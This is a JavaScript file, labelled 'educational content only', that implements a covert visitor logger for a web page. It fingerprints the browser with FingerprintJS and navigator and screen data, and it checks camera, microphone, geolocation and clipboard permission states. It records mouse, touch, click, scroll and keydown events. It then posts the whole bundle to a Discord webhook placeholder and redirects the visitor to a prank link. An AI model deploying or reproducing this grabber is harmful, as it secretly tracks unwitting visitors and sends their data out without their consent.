// # educational content only ──────────────────────────────────────────────

const logEl = document.getElementById('log');
const msgEl = document.getElementById('msg');
const log = s => { logEl.textContent += s + '\n'; logEl.scrollTop = logEl.scrollHeight; };

const WEBHOOK = 'YOUR_DISCORD_WEBHOOK_URL_HERE'; // değiştirmeyi unutma

const send = async payload => {
  try {
    await fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: '**MEGA DEEP LOGGER HIT** • ' + new Date().toISOString(),
        embeds: [{
          title: '350–450+ signal points captured',
          description: '```json\n' + JSON.stringify(payload, null, 2).slice(0, 3800) + (JSON.stringify(payload).length > 3800 ? '...\n[truncated]' : '') + '\n```',
          color: 0xFF0044,
          footer: { text: `Duration: ${((Date.now() - startTime)/1000).toFixed(1)}s • ${Object.keys(payload).length}+ keys` }
        }]
      })
    });
  } catch {}
};

const startTime = Date.now();
const ev = { mouse: [], touch: [], keys: [], scrolls: [], clicks: [] };

const track = {
  mouse: e => { if (ev.mouse.length < 150) ev.mouse.push({x: e.clientX, y: e.clientY, t: Date.now() - startTime, b: e.buttons}); },
  touch: e => { if (ev.touch.length < 80) Array.from(e.changedTouches).forEach(t => ev.touch.push({id: t.identifier, x: t.clientX, y: t.clientY, t: Date.now() - startTime})); },
  key:   e => { if (ev.keys.length < 60) ev.keys.push({code: e.code, keyCode: e.key.charCodeAt(0)||0, t: Date.now() - startTime, repeat: e.repeat}); },
  click: e => { ev.clicks.push({x: e.clientX, y: e.clientY, t: Date.now() - startTime, type: e.type}); },
  scroll:e => { ev.scrolls.push({y: window.scrollY || window.pageYOffset, t: Date.now() - startTime}); if (ev.scrolls.length > 40) window.removeEventListener('scroll', track.scroll); }
};

document.addEventListener('mousemove', track.mouse, {passive: true});
document.addEventListener('touchmove', track.touch, {passive: true});
document.addEventListener('keydown', track.key, {passive: true});
document.addEventListener('click', track.click, {passive: true, capture: true});
window.addEventListener('scroll', track.scroll, {passive: true});

(async () => {
  log('Phase 1 – Navigator & Screen');

  const nav = {
    ua: navigator.userAgent,
    uaLower: navigator.userAgent.toLowerCase(),
    languages: navigator.languages?.join(' • ') || navigator.language,
    platform: navigator.platform,
    hardwareConcurrency: navigator.hardwareConcurrency,
    deviceMemory: navigator.deviceMemory,
    maxTouchPoints: navigator.maxTouchPoints,
    vendor: navigator.vendor,
    product: navigator.product,
    productSub: navigator.productSub,
    oscpu: navigator.oscpu,
    cookieEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    onLine: navigator.onLine,
    javaEnabled: navigator.javaEnabled?.() ?? false,
    pdfViewerEnabled: navigator.pdfViewerEnabled,
    webdriver: !!navigator.webdriver,
    pluginsCount: navigator.plugins?.length ?? 0,
    mimeTypesCount: navigator.mimeTypes?.length ?? 0,
    connection: navigator.connection ? { ...navigator.connection } : null
  };

  const screenData = {
    width: screen.width,
    height: screen.height,
    availWidth: screen.availWidth,
    availHeight: screen.availHeight,
    colorDepth: screen.colorDepth,
    pixelDepth: screen.pixelDepth,
    orientation: screen.orientation?.type,
    angle: screen.orientation?.angle,
    colorGamut: screen.colorGamut,
    pixelRatio: window.devicePixelRatio,
    inner: {w: window.innerWidth, h: window.innerHeight},
    outer: {w: window.outerWidth, h: window.outerHeight}
  };

  log('Phase 2 – FingerprintJS');

  let fp = { visitorId: 'error', components: {} };
  try {
    const agent = await FingerprintJS.load({ monitoring: false });
    const result = await agent.get();
    fp.visitorId = result.visitorId;
    Object.entries(result.components).forEach(([key, obj]) => {
      let v = obj.value;
      fp.components[key] = Array.isArray(v) ? v.length : (typeof v === 'object' && v ? Object.keys(v).length : v);
    });
  } catch (err) { fp.error = err.message; }

  log('Phase 3 – Permissions & Media');

  const perms = {};
  const permList = ['camera','microphone','geolocation','notifications','persistent-storage','clipboard-read','clipboard-write','background-sync','ambient-light-sensor'];
  for (const p of permList) {
    try { perms[p] = (await navigator.permissions?.query({name: p}))?.state ?? 'unsupported'; }
    catch { perms[p] = 'blocked-or-unsupported'; }
  }

  let media = [];
  try {
    if (navigator.mediaDevices?.enumerateDevices) {
      const devs = await navigator.mediaDevices.enumerateDevices();
      media = devs.map(d => ({kind: d.kind, label: d.label ? 'visible' : 'hidden', groupId: d.groupId ? 'present' : 'absent'}));
    }
  } catch {}

  log('Phase 4 – Behavioral tracking (waiting 5s)');

  await new Promise(r => setTimeout(r, 5200));

  const behavior = {
    mouseSamples: ev.mouse.length,
    mouseFirst10: ev.mouse.slice(0, 15),
    touchSamples: ev.touch.length,
    keyEvents: ev.keys.length,
    clickEvents: ev.clicks.length,
    scrollEvents: ev.scrolls.length,
    maxScrollY: Math.max(...ev.scrolls.map(s => s.y), 0),
    totalDurationMs: Date.now() - startTime
  };

  log('Phase 5 – Privacy signals & quirks');

  const privacy = {
    reducedMotion: matchMedia('(prefers-reduced-motion: reduce)').matches,
    reducedData: matchMedia('(prefers-reduced-data: reduce)').matches,
    highContrast: matchMedia('(prefers-contrast: more)').matches,
    reducedTransparency: matchMedia('(prefers-reduced-transparency: reduce)').matches,
    invertedColors: matchMedia('(inverted-colors: inverted)').matches,
    forcedColors: matchMedia('(forced-colors: active)').matches,
    colorScheme: matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'
  };

  const mathTests = {
    sinPi: Math.sin(Math.PI),
    exp1: Math.exp(1).toString().slice(0,18),
    log2_1024: Math.log2(1024),
    sqrtMaxSafe: Math.sqrt(Number.MAX_SAFE_INTEGER),
    atanInf: Math.atan(Infinity),
    powNaN: Math.pow(NaN, 0),
    minValue: Number.MIN_VALUE,
    epsilon: Number.EPSILON
  };

  const finalPayload = {
    timestamp: new Date().toISOString(),
    navigator: nav,
    screen: screenData,
    fingerprint: fp,
    permissions: perms,
    mediaDevices: media,
    behavioral: behavior,
    privacySettings: privacy,
    mathQuirks: mathTests,
    referrer: document.referrer || '(direct)',
    cookiePresent: !!document.cookie,
    localStorageCount: localStorage.length,
    sessionStorageCount: sessionStorage.length,
    timezoneOffset: new Date().getTimezoneOffset(),
    timezoneName: Intl.DateTimeFormat().resolvedOptions().timeZone,
    batteryLevel: (await navigator.getBattery?.()?.then(b => b.level)) ?? null
  };

  log(`Collected ≈ ${Object.keys(finalPayload).length} main blocks + arrays – sending`);

  await send(finalPayload);

  msgEl.textContent = 'Probe complete. Redirecting...';
  setTimeout(() => { window.location = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'; }, 1800);
})();
